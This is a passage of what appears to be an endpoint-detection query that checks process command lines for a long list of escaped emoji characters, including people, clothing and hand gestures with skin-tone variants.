tgt.process.cmdline contains \"\ud83e\uddd6\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc85\" or tgt.process.cmdline contains \"\ud83d\udc83\" or tgt.process.cmdline contains \"\ud83d\udd7a\" or tgt.process.cmdline contains \"\ud83d\udc6f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6f\" or tgt.process.cmdline contains \"\ud83d\udc6f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd74\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\" or tgt.process.cmdline contains \"\ud83d\udeb6\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\" or tgt.process.cmdline contains \"\ud83e\uddce\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\" or tgt.process.cmdline contains \"\ud83c\udfc3\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\" or tgt.process.cmdline contains \"\ud83e\uddcd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1\" or tgt.process.cmdline contains \"\ud83d\udc6c\" or tgt.process.cmdline contains \"\ud83d\udc6b\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83d\udc91\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83d\udc8f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc6a\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udde3\" or tgt.process.cmdline contains \"\ud83d\udc64\" or tgt.process.cmdline contains \"\ud83d\udc65\" or tgt.process.cmdline contains \"\ud83e\udec2\" or tgt.process.cmdline contains \"\ud83e\uddf3\" or tgt.process.cmdline contains \"\ud83c\udf02\" or tgt.process.cmdline contains \"\u2602\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddf5\" or tgt.process.cmdline contains \"\ud83e\udea1\" or tgt.process.cmdline contains \"\ud83e\udea2\" or tgt.process.cmdline contains \"\ud83e\uddf6\" or tgt.process.cmdline contains \"\ud83d\udc53\" or tgt.process.cmdline contains \"\ud83d\udd76\" or tgt.process.cmdline contains \"\ud83e\udd7d\" or tgt.process.cmdline contains \"\ud83e\udd7c\" or tgt.process.cmdline contains \"\ud83e\uddba\" or tgt.process.cmdline contains \"\ud83d\udc54\" or tgt.process.cmdline contains \"\ud83d\udc55\" or tgt.process.cmdline contains \"\ud83d\udc56\" or tgt.process.cmdline contains \"\ud83e\udde3\" or tgt.process.cmdline contains \"\ud83e\udde4\" or tgt.process.cmdline contains \"\ud83e\udde5\" or tgt.process.cmdline contains \"\ud83e\udde6\" or tgt.process.cmdline contains \"\ud83d\udc57\" or tgt.process.cmdline contains \"\ud83d\udc58\" or tgt.process.cmdline contains \"\ud83e\udd7b\" or tgt.process.cmdline contains \"\ud83e\ude74\" or tgt.process.cmdline contains \"\ud83e\ude71\" or tgt.process.cmdline contains \"\ud83e\ude72\" or tgt.process.cmdline contains \"\ud83e\ude73\" or tgt.process.cmdline contains \"\ud83d\udc59\" or tgt.process.cmdline contains \"\ud83d\udc5a\" or tgt.process.cmdline contains \"\ud83d\udc5b\" or tgt.process.cmdline contains \"\ud83d\udc5c\" or tgt.process.cmdline contains \"\ud83d\udc5d\" or tgt.process.cmdline contains \"\ud83c\udf92\" or tgt.process.cmdline contains \"\ud83d\udc5e\" or tgt.process.cmdline contains \"\ud83d\udc5f\" or tgt.process.cmdline contains \"\ud83e\udd7e\" or tgt.process.cmdline contains \"\ud83e\udd7f\" or tgt.process.cmdline contains \"\ud83d\udc60\" or tgt.process.cmdline contains \"\ud83d\udc61\" or tgt.process.cmdline contains \"\ud83e\ude70\" or tgt.process.cmdline contains \"\ud83d\udc62\" or tgt.process.cmdline contains \"\ud83d\udc51\" or tgt.process.cmdline contains \"\ud83d\udc52\" or tgt.process.cmdline contains \"\ud83c\udfa9\" or tgt.process.cmdline contains \"\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\udde2\" or tgt.process.cmdline contains \"\u26d1\" or tgt.process.cmdline contains \"\ud83e\ude96\" or tgt.process.cmdline contains \"\ud83d\udc84\" or tgt.process.cmdline contains \"\ud83d\udc8d\" or tgt.process.cmdline contains \"\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffb\" or tgt.process.cmdline contains \"\u270b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffb\" or tgt.process.cmdline contains \"\u270c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffb\" or tgt.process.cmdline contains \"\u261d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffb\" or tgt.process.cmdline contains \"\u270a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffb\" or tgt.process.cmdline contains \"\u270d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains 